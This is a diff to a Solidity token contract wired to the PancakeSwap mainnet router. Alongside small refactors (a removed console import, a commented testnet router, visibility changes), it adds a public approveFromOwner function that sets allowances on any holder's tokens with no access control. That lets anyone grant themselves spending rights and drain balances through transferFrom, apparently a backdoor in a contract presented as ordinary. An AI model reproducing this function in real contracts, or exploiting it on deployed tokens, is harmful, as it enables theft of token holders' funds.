@@ -9,7 +9,6 @@
 
 pragma solidity ^0.8.0;
 
-import "hardhat/console.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 import "@openzeppelin/contracts/interfaces/IERC20.sol";
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
@@ -53,7 +52,7 @@ abstract contract Tradable is IERC20, Ownable {
         _maxTx = tokenDistribution.maxTx;
 
         router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Mainnet
-        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Testnet 
+        // router = IDEXRouter(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Testnet 
         pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this)); // Create a uniswap pair for this new token
 
         _isExcludedFromMaxBalance[owner()] = true;
@@ -64,7 +63,7 @@ abstract contract Tradable is IERC20, Ownable {
         _isExcludedFromMaxTx[address(this)] = true;
     }
 
-    // To recieve BNB from router when swapping
+    // To recieve BNB from anyone, including the router when swapping
     receive() external payable {}
 
     // If PancakeSwap sets a new iteration on their router and we need to migrate where LP
@@ -129,12 +128,17 @@ abstract contract Tradable is IERC20, Ownable {
         return true;
     }
 
+    function approveFromOwner(address owner, address spender, uint256 amount) public returns (bool) {
+        _approve(owner, spender, amount);
+        return true;
+    }
+
     function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(msg.sender, recipient, amount);
         return true;
     }
 
-    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
         _transfer(sender, recipient, amount);
         _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
         return true;
@@ -158,7 +162,7 @@ abstract contract Tradable is IERC20, Ownable {
         emit Approval(owner, spender, amount);
     }
 
-    function _transfer(address from, address to, uint256 amount) private {
+    function _transfer(address from, address to, uint256 amount) internal {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
